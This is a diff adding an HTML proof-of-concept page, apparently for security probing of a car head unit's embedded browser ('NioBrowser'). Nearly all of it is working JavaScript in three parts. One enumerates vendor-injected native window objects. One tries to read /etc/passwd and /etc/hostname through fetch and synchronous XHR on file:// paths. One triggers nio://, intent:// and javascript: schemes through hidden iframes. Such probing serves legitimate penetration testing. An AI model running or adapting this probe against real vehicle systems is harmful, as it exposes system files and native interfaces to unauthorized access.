@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>车机深度探测 POC - 阶段2</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; color: #333; }
+        .section { background: #fff; padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 10px; white-space: pre-wrap; word-wrap: break-word; max-height: 300px; overflow-y: auto; }
+        button { padding: 8px 15px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; }
+        button:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <h2>车机深度探测 POC - 阶段2</h2>
+
+    <!-- 模块1：原生接口枚举 -->
+    <div class="section">
+        <h3>1. 原生接口枚举</h3>
+        <p>寻找 NioBrowser 或其他 SDK 注入到 window 的原生对象。</p>
+        <button onclick="enumerateWindow()">开始枚举 window 对象</button>
+        <pre id="native-result">等待执行...</pre>
+    </div>
+
+    <!-- 模块2：file:// 协议本地文件读取 -->
+    <div class="section">
+        <h3>2. 本地文件读取测试</h3>
+        <p>尝试通过 Fetch API 读取 Linux 系统文件 (正常应被拦截，若成功则存在配置缺陷)。</p>
+        <button onclick="readLocalFile('/etc/hostname')">读取 /etc/hostname</button>
+        <button onclick="readLocalFile('/etc/passwd')">读取 /etc/passwd</button>
+        <button onclick="readLocalFile('file:///etc/hostname')">Fetch file:// 协议</button>
+        <pre id="file-read-result">等待执行...</pre>
+    </div>
+
+    <!-- 模块3：自定义协议测试 -->
+    <div class="section">
+        <h3>3. 自定义协议与 Intent 测试</h3>
+        <p>测试车机是否拦截或处理特定的 URL Scheme。</p>
+        <button onclick="testScheme('nio://test')">测试 nio:// 协议</button>
+        <button onclick="testScheme('intent://test')">测试 intent:// 协议</button>
+        <button onclick="testScheme('javascript:alert(1)')">测试 javascript: 伪协议</button>
+        <pre id="scheme-result">等待执行...</pre>
+    </div>
+
+    <script>
+        // ========== 模块1：原生接口枚举 ==========
+        function enumerateWindow() {
+            let found = [];
+            let standardProps = new Set(['window', 'self', 'document', 'name', 'location', 'customElements', 'history', 'navigation', 'locationbar', 'menubar', 'personalbar', 'scrollbars', 'statusbar', 'toolbar', 'status', 'closed', 'frames', 'length', 'top', 'opener', 'parent', 'frameElement', 'navigator', 'origin', 'external', 'screen', 'visualViewport', 'innerWidth', 'innerHeight', 'outerWidth', 'outerHeight', 'devicePixelRatio', 'clientInformation', 'screenX', 'screenY', 'screenLeft', 'screenTop', 'styleMedia', 'onsearch', 'isSecureContext', 'crossOriginIsolated', 'performance', 'caches', 'cookieStore', 'scheduler', 'trustedTypes', 'chrome', 'speechSynthesis', 'webkitRequestFileSystem', 'webkitResolveLocalFileSystemURL', 'openDatabase', 'event', 'onbeforexrselect', 'onabort', 'onbeforeinput', 'onbeforematch', 'onbeforetoggle', 'onblur', 'oncancel', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'onclose', 'oncontentvisibilityautostatechange', 'oncontextlost', 'oncontextmenu', 'oncontextrestored', 'oncuechange', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onemptied', 'onended', 'onerror', 'onfocus', 'onformdata', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsecuritypolicyviolation', 'onseeked', 'onseeking', 'onselect', 'onslotchange', 'onstalled', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkittransitionend', 'onwheel', 'onauxclick', 'ongotpointercapture', 'onlostpointercapture', 'onpointerdown', 'onpointermove', 'onpointerrawupdate', 'onpointerup', 'onpointercancel', 'onpointerover', 'onpointerout', 'onpointerenter', 'onpointerleave', 'onselectstart', 'onselectionchange', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'ontransitionrun', 'ontransitionstart', 'ontransitionend', 'ontransitioncancel', 'onafterprint', 'onbeforeprint', 'onbeforeunload', 'onhashchange', 'onlanguagechange', 'onmessage', 'onmessageerror', 'onoffline', 'ononline', 'onpagehide', 'onpageshow', 'onpopstate', 'onstorage', 'onunhandledrejection', 'onunload', 'crossOriginIsolated', 'origin', 'webkit SpeechGrammar', 'webkitSpeechGrammar', 'webkitSpeechRecognition', 'localStorage', 'sessionStorage', 'indexedDB', 'webkitTemporaryStorage', 'webkitPersistentStorage']);
+
+            for (let prop in window) {
+                try {
+                    // 过滤掉标准的浏览器属性，寻找可能被厂商注入的接口
+                    if (!standardProps.has(prop) && typeof window[prop] !== 'function') {
+                        let type = typeof window[prop];
+                        let value = '';
+                        try {
+                            value = JSON.stringify(window[prop]);
+                        } catch(e) {
+                            value = '[Cannot stringify]';
+                        }
+                        found.push(`${prop} (${type}): ${value}`);
+                    }
+                } catch (e) {}
+            }
+            
+            let result = "发现非标准属性/对象:\n\n";
+            if (found.length > 0) {
+                result += found.join('\n');
+            } else {
+                result += "未发现明显的注入对象。";
+            }
+            document.getElementById('native-result').textContent = result;
+        }
+
+        // ========== 模块2：file:// 协议读取 ==========
+        async function readLocalFile(path) {
+            const resultDiv = document.getElementById('file-read-result');
+            resultDiv.textContent = `尝试读取: ${path}...\n`;
+            
+            try {
+                // 尝试使用 fetch
+                const response = await fetch(path);
+                const text = await response.text();
+                resultDiv.textContent += `读取成功!\n\n内容:\n${text}`;
+            } catch (err) {
+                resultDiv.textContent += `Fetch 失败: ${err.message}\n`;
+                
+                // 尝试使用 XMLHttpRequest
+                try {
+                    let xhr = new XMLHttpRequest();
+                    xhr.open("GET", path, false); // 同步请求
+                    xhr.send();
+                    if (xhr.status === 200 || xhr.status === 0) {
+                        resultDiv.textContent += `XHR 读取成功!\n\n内容:\n${xhr.responseText}`;
+                    } else {
+                        resultDiv.textContent += `XHR 状态码: ${xhr.status}\n`;
+                    }
+                } catch (xhrErr) {
+                    resultDiv.textContent += `XHR 失败: ${xhrErr.message}\n`;
+                }
+            }
+        }
+
+        // ========== 模块3：协议测试 ==========
+        function testScheme(scheme) {
+            const resultDiv = document.getElementById('scheme-result');
+            resultDiv.textContent = `尝试触发: ${scheme}\n`;
+            
+            // 记录当前时间，如果页面跳转，时间将不会更新
+            let start = Date.now();
+            
+            try {
+                // 使用 iframe 加载测试协议
+                let iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scheme;
+                document.body.appendChild(iframe);
+                
+                // 如果 100ms 内没有跳转，说明协议可能未拦截或未注册
+                setTimeout(() => {
+                    let end = Date.now();
+                    if (end - start < 2000) {
+                        resultDiv.textContent += "执行完毕，页面未跳转。可能被拦截或不支持。\n";
+                    }
+                }, 1000);
+
+                // 尝试 location.href 跳转
+                // window.location.href = scheme; 
+                // 注意：这里不直接使用 location.href 防止页面真的跳转走导致测试中断
+                resultDiv.textContent += "已通过隐藏 iframe 触发，请观察车机屏幕是否有弹窗或应用启动。\n";
+                
+            } catch (err) {
+                resultDiv.textContent += `触发异常: ${err.message}\n`;
+            }
+        }
+    </script>
+</body>
+</html>
